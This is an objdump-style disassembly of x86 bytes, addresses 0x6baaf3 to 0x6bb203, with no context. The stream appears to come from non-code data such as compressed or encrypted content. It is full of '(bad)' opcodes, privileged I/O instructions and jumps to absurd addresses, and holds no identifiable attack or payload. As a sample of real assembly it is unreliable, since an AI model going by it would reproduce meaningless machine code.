  6baaf3:	adc    DWORD PTR [eax+esi*8+0x17e9450d],0xb70ad7ba
  6baafe:	jge    0x6baaa1
  6bab00:	jge    0x6bab0f
  6bab02:	mov    esp,DWORD PTR [ebp+0x3c]
  6bab05:	call   0xabcbb1
  6bab0a:	jmp    0x197f5aa3
  6bab0f:	adc    eax,0xeabb7d9
  6bab14:	jecxz  0x6bab2c
  6bab16:	pop    ebx
  6bab17:	lods   al,BYTE PTR ds:[esi]
  6bab18:	aad    0xbd
  6bab1a:	xchg   edx,eax
  6bab1b:	aaa    
  6bab1c:	pusha  
  6bab1d:	scas   al,BYTE PTR es:[edi]
  6bab1e:	popa   
  6bab1f:	and    esp,DWORD PTR [edi+0x5f]
  6bab22:	mov    edi,0x860e05e2
  6bab27:	fidivr WORD PTR [edx+0x60]
  6bab2a:	in     eax,0x18
  6bab2c:	scas   al,BYTE PTR es:[edi]
  6bab2d:	mov    dh,0xab
  6bab2f:	sbb    DWORD PTR [edi-0x6ab4fa8e],esp
  6bab35:	pop    esi
  6bab36:	mul    ah
  6bab38:	(bad)  
  6bab39:	enter  0x273a,0xfa
  6bab3d:	push   eax
  6bab3e:	xchg   BYTE PTR [eax+0x743eec35],dl
  6bab44:	lahf   
  6bab45:	loop   0x6bab57
  6bab47:	lahf   
  6bab48:	mov    WORD PTR [ebx+0xaa3eb98],?
  6bab4e:	pushf  
  6bab4f:	and    al,0xef
  6bab51:	jl     0x6babcd
  6bab53:	mov    ah,0x8e
  6bab55:	outs   dx,DWORD PTR ds:[esi]
  6bab56:	dec    edx
  6bab57:	sub    al,ch
  6bab59:	fdivr  QWORD PTR [edx+ebx*4+0x26]
  6bab5d:	add    ecx,esp
  6bab5f:	xor    BYTE PTR [esi+0x11],0x12
  6bab63:	loope  0x6bab9a
  6bab65:	pop    edx
  6bab66:	imul   esi,DWORD PTR [edx+0x76a95526],0xffffffc5
  6bab6d:	(bad)  
  6bab6e:	mov    al,ds:0x77e1135d
  6bab73:	dec    esp
  6bab74:	mov    ss,WORD PTR [edi]
  6bab76:	jl     0x6bab3a
  6bab78:	test   al,0x12
  6bab7a:	in     al,0x30
  6bab7c:	cmp    eax,edx
  6bab7e:	mov    al,0xa1
  6bab80:	mov    al,0x42
  6bab82:	push   ds
  6bab83:	lds    esp,FWORD PTR [ebx-0x244ae53d]
  6bab89:	mov    dh,0x40
  6bab8b:	mov    eax,0x6cde0486
  6bab90:	xor    dh,BYTE PTR [edi+0x43]
  6bab93:	aas    
  6bab94:	(bad)  
  6bab95:	mov    eax,0xb2bdd5e
  6bab9a:	lea    esi,[ebx]
  6bab9c:	out    0x8f,eax
  6bab9e:	outs   dx,BYTE PTR ds:[esi]
  6bab9f:	ds push esi
  6baba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6baba2:	or     ch,BYTE PTR [edx-0x4a9b40ab]
  6baba8:	fimul  WORD PTR [ecx]
  6babaa:	out    dx,eax
  6babab:	out    0xac,eax
  6babad:	add    BYTE PTR [edx+0x60],bl
  6babb0:	out    dx,eax
  6babb1:	(bad)  
  6babb2:	mov    bh,dh
  6babb4:	retf   0xcd18
  6babb7:	push   DWORD PTR [ebx+0x10]
  6babba:	fcmovne st,st(5)
  6babbc:	ret    0x1eb8
  6babbf:	arpl   WORD PTR [edx-0x485f923f],cx
  6babc5:	adc    BYTE PTR [edi-0x4d],bl
  6babc8:	xchg   ebp,eax
  6babc9:	das    
  6babca:	stc    
  6babcb:	enter  0x166,0x89
  6babcf:	ret    
  6babd0:	inc    eax
  6babd1:	popa   
  6babd2:	sbb    esp,esp
  6babd4:	neg    esp
  6babd6:	repz and bh,BYTE PTR [ebp+0x5]
  6babda:	rol    BYTE PTR [eax+0x420d5453],0x9c
  6babe1:	shl    DWORD PTR [esi+eax*2-0x6c9e8d83],0xd4
  6babe9:	jmp    0x6babf1
  6babeb:	sahf   
  6babec:	xor    BYTE PTR [esi+0x57],dl
  6babef:	rol    DWORD PTR [ecx-0x7c489222],0x52
  6babf6:	pop    edi
  6babf7:	lock jle 0x6babe3
  6babfa:	lods   eax,DWORD PTR ds:[esi]
  6babfb:	jbe    0x6bab87
  6babfd:	sub    DWORD PTR [edi+0x569fa774],eax
  6bac03:	sub    bl,BYTE PTR [edx+ebp*1-0x28]
  6bac07:	test   ecx,edi
  6bac09:	int    0xa0
  6bac0b:	jp     0x6babdb
  6bac0d:	or     dl,BYTE PTR [ebx+esi*2-0x49547142]
  6bac14:	xchg   esi,eax
  6bac15:	iret   
  6bac16:	add    ebp,edi
  6bac18:	mov    ecx,0xac7b2dcc
  6bac1d:	lock int 0x3f
  6bac20:	add    al,0x24
  6bac22:	cmp    al,0x8a
  6bac24:	mov    edi,0x9b36f0f3
  6bac29:	pop    eax
  6bac2a:	lods   eax,DWORD PTR ds:[esi]
  6bac2b:	jno    0x6babae
  6bac2d:	ficom  DWORD PTR [edi-0x5853b35a]
  6bac33:	push   ebp
  6bac34:	scas   al,BYTE PTR es:[edi]
  6bac35:	fs ret 0xa718
  6bac39:	call   0x8f2e:0x33f89e4
  6bac40:	jo     0x6bac1c
  6bac42:	popf   
  6bac43:	mov    esi,0xf627d279
  6bac48:	cmp    BYTE PTR [eax+0x5b],bh
  6bac4b:	js     0x6bac19
  6bac4d:	stc    
  6bac4e:	or     edx,eax
  6bac50:	push   esp
  6bac51:	pop    es
  6bac52:	out    dx,al
  6bac53:	push   ds
  6bac54:	mov    al,0x1c
  6bac56:	popa   
  6bac57:	jb     0x6bac74
  6bac59:	jmp    0x6bac01
  6bac5b:	inc    edi
  6bac5c:	fld    DWORD PTR [ebx+0x6d]
  6bac5f:	(bad)  
  6bac60:	jae    0x6babe7
  6bac62:	sbb    ch,cl
  6bac64:	in     al,dx
  6bac65:	mov    ah,BYTE PTR [edx-0x4a]
  6bac68:	in     eax,dx
  6bac69:	inc    ebx
  6bac6a:	pop    ds
  6bac6b:	pushf  
  6bac6c:	or     al,0xb9
  6bac6e:	dec    edx
  6bac6f:	or     DWORD PTR [esi],ebx
  6bac71:	cmp    al,0x66
  6bac73:	add    DWORD PTR [ecx-0x658ca970],esi
  6bac79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bac7a:	or     dh,BYTE PTR [eax]
  6bac7c:	je     0x6bac0b
  6bac7e:	lock jns 0x6bacd3
  6bac81:	retf   0x9a94
  6bac84:	ja     0x6bac80
  6bac86:	cmp    ebx,ebx
  6bac88:	imul   edi,DWORD PTR [eax],0xffffffe5
  6bac8b:	sub    al,BYTE PTR [edx+0x259fbf0c]
  6bac91:	iret   
  6bac92:	push   ebp
  6bac93:	cmc    
  6bac94:	pop    ebp
  6bac95:	loop   0x6bacd5
  6bac97:	dec    eax
  6bac98:	sub    BYTE PTR [edx+0x3e583aee],0x8c
  6bac9f:	or     eax,0x71989f
  6baca4:	aam    0xf2
  6baca6:	mov    edx,0x648b09ef
  6bacab:	test   al,0x5e
  6bacad:	dec    edx
  6bacae:	ret    0x9e7c
  6bacb1:	(bad)  
  6bacb2:	fwait
  6bacb3:	xor    eax,0x149b9683
  6bacb8:	or     cl,dl
  6bacba:	data16 sahf 
  6bacbc:	pop    ebp
  6bacbd:	mov    BYTE PTR [edi],bl
  6bacbf:	fwait
  6bacc0:	(bad)  
  6bacc1:	imul   ebx,DWORD PTR [eax-0x1b],0x9
  6bacc5:	pop    ebp
  6bacc6:	daa    
  6bacc7:	popa   
  6bacc8:	fs push ecx
  6bacca:	retf   
  6baccb:	ret    0xfbaa
  6bacce:	repnz dec eax
  6bacd0:	test   DWORD PTR [ebp-0x1c],ebx
  6bacd3:	imul   edx,DWORD PTR [edx-0x7598347d],0x1be235b3
  6bacdd:	mov    esp,ebp
  6bacdf:	inc    eax
  6bace0:	jne    0x6bac62
  6bace2:	xchg   esi,eax
  6bace3:	aas    
  6bace4:	pop    es
  6bace5:	pop    ss
  6bace6:	mov    al,BYTE PTR [edi*8-0x3dc290c3]
  6baced:	leave  
  6bacee:	(bad)  
  6bacef:	leave  
  6bacf0:	mov    ebx,0xad7f6a29
  6bacf5:	ds cmp al,0xa
  6bacf8:	in     al,dx
  6bacf9:	and    DWORD PTR [esi],ebp
  6bacfb:	cli    
  6bacfc:	es scas eax,DWORD PTR es:[edi]
  6bacfe:	mov    cl,0xbf
  6bad00:	sar    BYTE PTR [di],cl
  6bad03:	daa    
  6bad04:	xchg   BYTE PTR ds:0x442a83f0,dl
  6bad0a:	xor    al,0xb5
  6bad0c:	cmp    DWORD PTR ds:0xaa218979,edi
  6bad12:	xchg   esp,eax
  6bad13:	out    dx,eax
  6bad14:	data16 jl 0x6bad2a
  6bad17:	mov    ebp,DWORD PTR [edx-0x6]
  6bad1a:	push   eax
  6bad1b:	mov    ecx,0xb549420b
  6bad20:	jp     0x6baca2
  6bad22:	int    0x6a
  6bad24:	add    al,0x64
  6bad26:	or     eax,0x974cd03d
  6bad2b:	inc    ebx
  6bad2c:	inc    esp
  6bad2d:	test   eax,0x8a25cc8d
  6bad32:	cli    
  6bad33:	gs int3 
  6bad35:	mov    cl,BYTE PTR [ebp-0x71cfd31d]
  6bad3b:	xchg   ebx,eax
  6bad3c:	call   0xa03ae1ec
  6bad41:	in     eax,0xda
  6bad43:	dec    eax
  6bad44:	cwde   
  6bad45:	jecxz  0x6bad33
  6bad47:	inc    esp
  6bad48:	push   ecx
  6bad49:	rol    BYTE PTR [edi-0x13],cl
  6bad4c:	and    DWORD PTR [edx-0x1f8b0579],ecx
  6bad52:	jmp    0x539eb2fc
  6bad57:	enter  0x625b,0x4f
  6bad5b:	jbe    0x6bad54
  6bad5d:	pop    edx
  6bad5e:	(bad)  
  6bad5f:	dec    ecx
  6bad60:	aaa    
  6bad61:	fwait
  6bad62:	sub    edx,DWORD PTR [esi]
  6bad64:	cmp    dh,BYTE PTR [edi]
  6bad66:	(bad)  
  6bad67:	fcmovnu st,st(3)
  6bad69:	ror    DWORD PTR [edx+0x22],1
  6bad6c:	aas    
  6bad6d:	dec    esi
  6bad6e:	xchg   esp,eax
  6bad6f:	adc    DWORD PTR [esi-0x2f268905],esp
  6bad75:	inc    edi
  6bad76:	jecxz  0x6bad47
  6bad78:	nop
  6bad79:	cmp    dh,bl
  6bad7b:	mul    DWORD PTR [ebp-0x47]
  6bad7e:	cli    
  6bad7f:	sbb    eax,0x402e93b5
  6bad84:	pushf  
  6bad85:	xchg   edi,eax
  6bad86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bad87:	mov    eax,0x1e21943d
  6bad8c:	push   esi
  6bad8d:	xor    ch,ah
  6bad8f:	es jp  0x6bae07
  6bad92:	adc    BYTE PTR [edx-0x29],bl
  6bad95:	lods   al,BYTE PTR ds:[esi]
  6bad96:	mov    eax,0xa2f89842
  6bad9b:	test   ecx,0x2f4b4032
  6bada1:	in     al,dx
  6bada2:	cmp    dl,cl
  6bada4:	mov    eax,0xdeae1c2b
  6bada9:	mov    eax,ds:0x3c985112
  6badae:	inc    esi
  6badaf:	add    ecx,DWORD PTR [ecx]
  6badb1:	or     eax,0xd6b82cb3
  6badb6:	daa    
  6badb7:	arpl   WORD PTR [edx],sp
  6badb9:	aad    0x79
  6badbb:	cmovs  ebp,DWORD PTR [esi-0x3f]
  6badbf:	xor    BYTE PTR [esi],0x84
  6badc2:	mov    esi,0x4d8baef7
  6badc7:	(bad)  
  6badc8:	push   cs
  6badc9:	add    ebx,DWORD PTR [esi+0x47]
  6badcc:	into   
  6badcd:	inc    ecx
  6badce:	adc    DWORD PTR [eax],0xc423088d
  6badd4:	int3   
  6badd5:	push   ds
  6badd6:	out    dx,eax
  6badd7:	and    DWORD PTR ds:0xe9a02106,0x4b7fe48f
  6bade1:	pop    ecx
  6bade2:	daa    
  6bade3:	test   BYTE PTR [ebp-0x5ca3f1b8],dh
  6bade9:	or     dh,BYTE PTR [esi]
  6badeb:	test   eax,0xa80dea2a
  6badf0:	mov    WORD PTR [edx],gs
  6badf2:	pop    eax
  6badf3:	imul   esp,DWORD PTR [edi-0x6c],0x11
  6badf7:	lock hlt 
  6badf9:	(bad)  
  6badfa:	mov    edi,0x28c2249f
  6badff:	cmp    eax,0x8f1d76f6
  6bae04:	xor    ebp,DWORD PTR [esi+0x5a]
  6bae07:	inc    ecx
  6bae08:	aaa    
  6bae09:	shl    ebx,0xf
  6bae0c:	in     eax,0x54
  6bae0e:	or     esp,DWORD PTR [eax]
  6bae10:	leave  
  6bae11:	enter  0x438c,0xe8
  6bae15:	push   eax
  6bae16:	es push ebx
  6bae18:	inc    eax
  6bae19:	out    0x71,al
  6bae1b:	scas   eax,DWORD PTR es:[edi]
  6bae1c:	mov    WORD PTR [esi+0x1e],gs
  6bae1f:	xchg   ebx,eax
  6bae20:	stos   BYTE PTR es:[edi],al
  6bae21:	(bad)  
  6bae23:	jne    0x6bae2d
  6bae25:	jge    0x6bae3a
  6bae27:	and    cl,al
  6bae29:	cdq    
  6bae2a:	aad    0x9f
  6bae2c:	(bad)  
  6bae2d:	jae    0x6badb2
  6bae2f:	stos   DWORD PTR es:[edi],eax
  6bae30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bae31:	dec    esp
  6bae32:	push   edi
  6bae33:	ret    0xa271
  6bae36:	dec    esp
  6bae37:	lock xchg ecx,eax
  6bae39:	sbb    edi,ebp
  6bae3b:	sbb    eax,0x4f8c2ddb
  6bae40:	(bad)  
  6bae41:	(bad)  
  6bae42:	inc    ebx
  6bae43:	jecxz  0x6badcb
  6bae45:	leave  
  6bae46:	aad    0xa0
  6bae48:	inc    ecx
  6bae49:	jb     0x6bae46
  6bae4b:	mov    ds,ebp
  6bae4d:	and    dl,BYTE PTR [esi+eax*2-0x77]
  6bae51:	jle    0x6badf6
  6bae53:	nop
  6bae54:	push   esi
  6bae55:	cmp    eax,0xef91ceb4
  6bae5a:	dec    eax
  6bae5b:	les    ebx,FWORD PTR [edx]
  6bae5d:	fld    DWORD PTR [ebx-0x20de3a58]
  6bae63:	xchg   DWORD PTR [ebp*8-0xd261f06],edx
  6bae6a:	sbb    eax,0xa6ee04a8
  6bae6f:	mov    ch,0xe
  6bae71:	lods   eax,DWORD PTR ds:[esi]
  6bae72:	adc    BYTE PTR [ebp-0x43],0x9f
  6bae76:	mov    DWORD PTR ss:[eax+edx*4-0x1d],ebx
  6bae7b:	mov    edx,0x8fc47325
  6bae80:	frstor [ecx-0x7105e1bd]
  6bae86:	movsx  esi,BYTE PTR [esi+0x72]
  6bae8a:	cmp    ecx,DWORD PTR [esi+eax*1]
  6bae8d:	idiv   DWORD PTR [edi+ecx*8-0x14]
  6bae91:	lock pop ecx
  6bae93:	jo     0x6bae68
  6bae95:	popa   
  6bae96:	pusha  
  6bae97:	add    DWORD PTR cs:[ecx-0x72966ae],esi
  6bae9e:	or     BYTE PTR [esi],al
  6baea0:	inc    eax
  6baea1:	push   edx
  6baea2:	addr16 sahf 
  6baea4:	cmp    ebx,esi
  6baea6:	aas    
  6baea7:	pcmpgtw mm6,QWORD PTR [eax+0x7c824ce8]
  6baeae:	mov    ds:0xb12e8b12,eax
  6baeb3:	mov    ds:0xcecb35e6,eax
  6baeb8:	jmp    0x6bae66
  6baeba:	scas   eax,DWORD PTR es:[edi]
  6baebb:	and    edi,DWORD PTR [esi-0x18ab8bf4]
  6baec1:	or     eax,0x73243e92
  6baec6:	clc    
  6baec7:	push   edx
  6baec8:	jecxz  0x6bae9e
  6baeca:	xchg   BYTE PTR [edi-0x34],bl
  6baecd:	xchg   esp,eax
  6baece:	and    DWORD PTR [edx-0x336c4c3b],ebp
  6baed4:	es call 0x1efd:0x1f59c68d
  6baedc:	dec    edx
  6baedd:	inc    esp
  6baede:	popa   
  6baedf:	push   ecx
  6baee0:	push   es
  6baee1:	inc    edi
  6baee2:	push   esp
  6baee3:	hlt    
  6baee4:	loope  0x6baedf
  6baee6:	mov    ds:0xe8a346ae,eax
  6baeeb:	cwde   
  6baeec:	aam    0x3e
  6baeee:	mov    cs:0x30991ad,eax
  6baef4:	(bad)  
  6baef5:	cmp    ebx,esi
  6baef7:	dec    ebx
  6baef8:	push   0x7f9ba52a
  6baefd:	jge    0x6bae9d
  6baeff:	loop   0x6bae91
  6baf01:	xchg   ecx,eax
  6baf02:	mov    ds:0x3b0349f,al
  6baf07:	pop    esp
  6baf08:	shl    DWORD PTR [edx],0x1e
  6baf0b:	jge    0x6baea8
  6baf0d:	in     al,0x96
  6baf0f:	mov    ds:0xbbc01af1,al
  6baf14:	add    BYTE PTR [ebx+0x2a],bh
  6baf17:	data16 hlt 
  6baf19:	or     ebx,DWORD PTR [ebx-0x4b]
  6baf1c:	outs   dx,DWORD PTR ds:[esi]
  6baf1d:	mov    edi,0x72835540
  6baf22:	pop    edi
  6baf23:	mov    al,0x37
  6baf25:	test   ah,bh
  6baf27:	push   ecx
  6baf28:	mov    ebp,0x39605a18
  6baf2d:	xchg   ebx,eax
  6baf2e:	xchg   DWORD PTR gs:[esi+0x272432f6],ecx
  6baf35:	mov    ebp,DWORD PTR [edx+0x7]
  6baf38:	jle    0x6baec3
  6baf3a:	mov    ebp,0x8a5f3a0a
  6baf3f:	pushf  
  6baf40:	repz mov dh,0xaf
  6baf43:	inc    ecx
  6baf44:	in     eax,dx
  6baf45:	push   eax
  6baf46:	repnz test al,0x80
  6baf49:	pop    ecx
  6baf4a:	loopne 0x6baf91
  6baf4c:	jp     0x6baed9
  6baf4e:	sbb    bh,al
  6baf50:	dec    esi
  6baf51:	inc    edx
  6baf52:	hlt    
  6baf53:	push   ds
  6baf54:	fbld   TBYTE PTR [edx]
  6baf56:	push   esi
  6baf57:	sub    eax,DWORD PTR [ebx+ecx*1+0x43]
  6baf5b:	fmul   QWORD PTR [edi]
  6baf5d:	ja     0x6bafa3
  6baf5f:	lock push ds
  6baf61:	inc    edx
  6baf62:	or     al,BYTE PTR [eax-0xd]
  6baf65:	jno    0x6baf0d
  6baf67:	add    DWORD PTR [esi],0x2e0721ab
  6baf6d:	outs   dx,BYTE PTR ds:[esi]
  6baf6e:	mov    ebp,0x1e2736f5
  6baf73:	sbb    DWORD PTR [edi-0x5b11f029],edi
  6baf79:	mul    ch
  6baf7b:	adc    bh,BYTE PTR [edx+0x39]
  6baf7e:	jle    0x6baf28
  6baf80:	shl    DWORD PTR [edi+edx*1+0x51],0xa0
  6baf85:	mov    dl,0x45
  6baf87:	xchg   BYTE PTR [ebx+0x65e9877e],ch
  6baf8d:	cmp    al,0xb1
  6baf8f:	nop
  6baf90:	int3   
  6baf91:	js     0x6bafeb
  6baf93:	dec    ebx
  6baf94:	mov    DWORD PTR [edx],esp
  6baf96:	jo     0x6baf5c
  6baf98:	fcmovbe st,st(5)
  6baf9a:	cs inc ebx
  6baf9c:	add    DWORD PTR [ebx-0x74],eax
  6baf9f:	retf   0xdea5
  6bafa2:	int    0xd5
  6bafa4:	aas    
  6bafa5:	ret    
  6bafa6:	add    bl,dl
  6bafa8:	dec    esi
  6bafa9:	int    0xaf
  6bafab:	aam    0x7c
  6bafad:	icebp  
  6bafae:	inc    edi
  6bafaf:	cdq    
  6bafb0:	repz jne 0x6bafab
  6bafb3:	sar    BYTE PTR [eax+0x3c],cl
  6bafb6:	aas    
  6bafb7:	push   ebx
  6bafb8:	or     BYTE PTR [edi],bl
  6bafba:	mov    ch,0xe7
  6bafbc:	pop    ds
  6bafbd:	int3   
  6bafbe:	fcmovnb st,st(1)
  6bafc0:	mov    ebp,cs
  6bafc2:	adc    DWORD PTR [edi],ebp
  6bafc4:	jp     0x6baf55
  6bafc6:	js     0x6bafdd
  6bafc8:	hlt    
  6bafc9:	xchg   DWORD PTR [esi],ebx
  6bafcb:	or     ebx,eax
  6bafcd:	xchg   edi,eax
  6bafce:	nop
  6bafcf:	dec    ebx
  6bafd0:	fsubr  DWORD PTR [ebx+0x6272c376]
  6bafd6:	inc    edx
  6bafd7:	adc    DWORD PTR ds:0xe91c77ff,edx
  6bafdd:	outs   dx,BYTE PTR ds:[esi]
  6bafde:	fdiv   DWORD PTR [esi]
  6bafe0:	push   ss
  6bafe1:	mov    ebp,0x9c1e382c
  6bafe6:	inc    esp
  6bafe7:	inc    eax
  6bafe8:	pop    edi
  6bafe9:	or     BYTE PTR [ecx-0x374e7f85],0xeb
  6baff0:	je     0x6baf97
  6baff2:	hlt    
  6baff3:	inc    eax
  6baff4:	in     al,0x6
  6baff6:	stos   DWORD PTR es:[edi],eax
  6baff7:	(bad)  
  6baff8:	mov    cl,0x40
  6baffa:	pop    esi
  6baffb:	inc    edi
  6baffc:	in     al,0x1c
  6baffe:	adc    bl,BYTE PTR es:[ebx]
  6bb001:	(bad)  
  6bb002:	lods   eax,DWORD PTR ds:[esi]
  6bb003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bb004:	push   edi
  6bb005:	jno    0x6bb00a
  6bb007:	imul   BYTE PTR [edx]
  6bb009:	and    edi,esp
  6bb00b:	adc    DWORD PTR [edx],0x7888751
  6bb011:	shr    BYTE PTR [ebx-0x6431d288],cl
  6bb017:	js     0x6baff1
  6bb019:	cmp    ecx,0x1f
  6bb01c:	sub    al,0x7f
  6bb01e:	fadd   QWORD PTR [esi-0x7c]
  6bb021:	mov    cl,BYTE PTR [edx]
  6bb023:	cmp    eax,0x583b1ee6
  6bb028:	dec    edi
  6bb029:	rcl    DWORD PTR [ecx+0x72b9cee4],0x87
  6bb030:	lds    esi,FWORD PTR [esi+eax*2+0x37379ca5]
  6bb037:	add    al,0x83
  6bb039:	fs (bad) 
  6bb03b:	jne    0x6bb0a0
  6bb03d:	test   DWORD PTR ds:0xe25705d1,ebx
  6bb043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bb044:	jg     0x6bb0b0
  6bb046:	dec    esi
  6bb047:	lds    esi,FWORD PTR [ecx-0x53]
  6bb04a:	scas   eax,DWORD PTR es:[edi]
  6bb04b:	push   ebp
  6bb04c:	int    0x3
  6bb04e:	xor    esp,DWORD PTR [edx+0x0]
  6bb051:	inc    ecx
  6bb052:	lods   eax,DWORD PTR ds:[esi]
  6bb053:	int3   
  6bb054:	out    dx,al
  6bb055:	ins    DWORD PTR es:[edi],dx
  6bb056:	fadd   QWORD PTR [esi+0x6afed579]
  6bb05c:	es shl al,0x60
  6bb060:	add    al,0xaa
  6bb062:	scas   eax,DWORD PTR es:[edi]
  6bb063:	outs   dx,BYTE PTR ds:[esi]
  6bb064:	sti    
  6bb065:	mov    al,0xe1
  6bb067:	sti    
  6bb068:	inc    ebx
  6bb069:	pop    esi
  6bb06a:	std    
  6bb06b:	inc    edi
  6bb06c:	pop    es
  6bb06d:	fcom   DWORD PTR [eax-0x3813317d]
  6bb073:	out    dx,eax
  6bb074:	lock dec ecx
  6bb076:	(bad)  
  6bb077:	ds jae 0x6bb059
  6bb07a:	cwde   
  6bb07b:	ret    0x9ad
  6bb07e:	add    edi,ebx
  6bb080:	cwde   
  6bb081:	mov    DWORD PTR [eax+0x34],ebx
  6bb084:	scas   eax,DWORD PTR es:[edi]
  6bb085:	pop    ds
  6bb086:	inc    edx
  6bb087:	cli    
  6bb088:	mov    ch,0x66
  6bb08a:	jne    0x6bb066
  6bb08c:	or     eax,0xe07e2aef
  6bb091:	gs mov ecx,0xfb34a7d5
  6bb097:	xchg   ebp,eax
  6bb098:	add    al,0xd5
  6bb09a:	enter  0x9a0d,0x6d
  6bb09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bb09f:	dec    ax
  6bb0a1:	ret    0x9ec2
  6bb0a4:	push   ecx
  6bb0a5:	repz shl esp,1
  6bb0a8:	pop    eax
  6bb0a9:	in     al,0x8d
  6bb0ab:	and    BYTE PTR [esi+ebx*8-0x1c],bl
  6bb0af:	(bad)  
  6bb0b0:	sbb    al,0x27
  6bb0b2:	xor    BYTE PTR [edi+0x7],0xb1
  6bb0b6:	(bad)  
  6bb0b7:	js     0x6bb10a
  6bb0b9:	retf   0x9db1
  6bb0bc:	scas   al,BYTE PTR es:[edi]
  6bb0bd:	retf   0xc35c
  6bb0c0:	icebp  
  6bb0c1:	lea    edx,[esi-0x7ef0ac20]
  6bb0c7:	push   ss
  6bb0c8:	retf   
  6bb0c9:	xor    eax,0x1af747d4
  6bb0ce:	dec    esi
  6bb0cf:	jl     0x6bb141
  6bb0d1:	and    dl,BYTE PTR [ebx+ecx*2]
  6bb0d4:	inc    esp
  6bb0d5:	inc    ebx
  6bb0d6:	push   es
  6bb0d7:	into   
  6bb0d8:	(bad)  
  6bb0d9:	in     al,0x90
  6bb0db:	add    ecx,DWORD PTR [edi+0x632a0765]
  6bb0e1:	test   DWORD PTR [edx-0x5d],ebx
  6bb0e4:	and    eax,0xd80a78eb
  6bb0e9:	loopne 0x6bb07c
  6bb0eb:	leave  
  6bb0ec:	mov    bl,0x63
  6bb0ee:	stos   DWORD PTR es:[edi],eax
  6bb0ef:	int3   
  6bb0f0:	popf   
  6bb0f1:	into   
  6bb0f2:	aas    
  6bb0f3:	stos   BYTE PTR es:[edi],al
  6bb0f4:	lock inc esp
  6bb0f6:	adc    DWORD PTR [edx+0x2f],ecx
  6bb0f9:	loope  0x6bb098
  6bb0fb:	pop    esp
  6bb0fc:	popf   
  6bb0fd:	mov    ebx,0xf7e0c323
  6bb102:	ds or  al,cl
  6bb105:	xchg   edx,eax
  6bb106:	jb     0x6bb09d
  6bb108:	mov    bl,BYTE PTR [ebx-0x601060f3]
  6bb10e:	xchg   esi,eax
  6bb10f:	or     ch,BYTE PTR [eax]
  6bb111:	cwde   
  6bb112:	ss jp  0x6bb0d0
  6bb115:	daa    
  6bb116:	aaa    
  6bb117:	and    al,BYTE PTR [ecx-0x68]
  6bb11a:	sub    eax,esp
  6bb11c:	bound  ecx,QWORD PTR [esi-0x1743b0e]
  6bb122:	into   
  6bb123:	jno    0x6bb13d
  6bb125:	or     BYTE PTR [ebx+0x6b9dd42f],dl
  6bb12b:	retf   
  6bb12c:	ror    BYTE PTR [edi-0x72374eaf],0xcd
  6bb133:	aaa    
  6bb134:	jno    0x6bb186
  6bb136:	lock inc ebp
  6bb138:	out    dx,eax
  6bb139:	test   ebx,0x452d6734
  6bb13f:	cmc    
  6bb140:	push   ebp
  6bb141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bb142:	arpl   WORD PTR [edi-0x4a3987ea],bp
  6bb148:	jo     0x6bb0e0
  6bb14a:	aaa    
  6bb14b:	pop    edx
  6bb14c:	(bad)  
  6bb14d:	jmp    0x6bb160
  6bb14f:	cmp    bh,cl
  6bb151:	or     BYTE PTR ds:0x12270947,dh
  6bb157:	in     al,0x9d
  6bb159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bb15a:	out    dx,eax
  6bb15b:	vcvtsi2sd xmm2,xmm6,DWORD PTR [edx]
  6bb15f:	inc    ecx
  6bb160:	and    al,0xc0
  6bb162:	pusha  
  6bb163:	jnp    0x6bb1ab
  6bb165:	dec    ebx
  6bb166:	jo     0x6bb1d9
  6bb168:	sub    eax,0x573f173
  6bb16d:	lock cs pushf 
  6bb170:	xchg   esi,eax
  6bb171:	push   eax
  6bb172:	xchg   ecx,eax
  6bb173:	mov    al,ds:0x2d824044
  6bb178:	mov    esp,0x689835b7
  6bb17d:	out    0x17,eax
  6bb17f:	arpl   WORD PTR [ebx-0x7a0c2b8f],si
  6bb185:	cli    
  6bb186:	add    al,0x95
  6bb188:	leave  
  6bb189:	fwait
  6bb18a:	push   ds
  6bb18b:	(bad)  
  6bb18e:	xlat   BYTE PTR ds:[ebx]
  6bb18f:	mov    bl,al
  6bb191:	cmp    eax,DWORD PTR [ebx+0x43]
  6bb194:	lea    edx,[esi]
  6bb196:	retf   0x95d6
  6bb199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bb19a:	mov    ah,0xc2
  6bb19c:	out    0xbf,al
  6bb19e:	or     al,0x3
  6bb1a0:	xchg   DWORD PTR [edi],ebx
  6bb1a2:	xchg   DWORD PTR [edi],esi
  6bb1a4:	ret    0x124a
  6bb1a7:	(bad)  
  6bb1a8:	sti    
  6bb1a9:	and    dh,BYTE PTR [esi+0xa97aeb5]
  6bb1af:	and    DWORD PTR [esi],ebp
  6bb1b1:	cmp    eax,0x254d50ac
  6bb1b6:	jmp    0x6bb1ff
  6bb1b8:	or     eax,0x7a60ad76
  6bb1bd:	iret   
  6bb1be:	mov    al,ds:0xbeaf8a9a
  6bb1c3:	cmp    edx,esi
  6bb1c5:	add    DWORD PTR [ecx],edx
  6bb1c7:	les    edi,FWORD PTR [ecx]
  6bb1c9:	mov    al,0x6d
  6bb1cb:	inc    esp
  6bb1cc:	hlt    
  6bb1cd:	test   eax,0xd683ab4d
  6bb1d2:	in     al,0xa6
  6bb1d4:	pop    esi
  6bb1d5:	inc    edi
  6bb1d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bb1d7:	icebp  
  6bb1d8:	inc    esp
  6bb1d9:	pop    edx
  6bb1da:	sbb    ch,bh
  6bb1dc:	mov    dl,0xc
  6bb1de:	pop    esi
  6bb1df:	(bad)  
  6bb1e0:	ins    DWORD PTR es:[edi],dx
  6bb1e1:	add    esi,DWORD PTR [esi-0x356ddf52]
  6bb1e7:	pop    ss
  6bb1e8:	push   es
  6bb1e9:	dec    esp
  6bb1ea:	(bad)  
  6bb1ec:	push   cs
  6bb1ed:	adc    bl,dl
  6bb1ef:	mov    esp,0x594556d9
  6bb1f4:	mov    WORD PTR [ebp-0x27b677],ds
  6bb1fa:	enter  0xe75c,0xdf
  6bb1fe:	jle    0x6bb251
  6bb200:	fldcw  WORD PTR [edx-0x79]
  6bb203:	std    
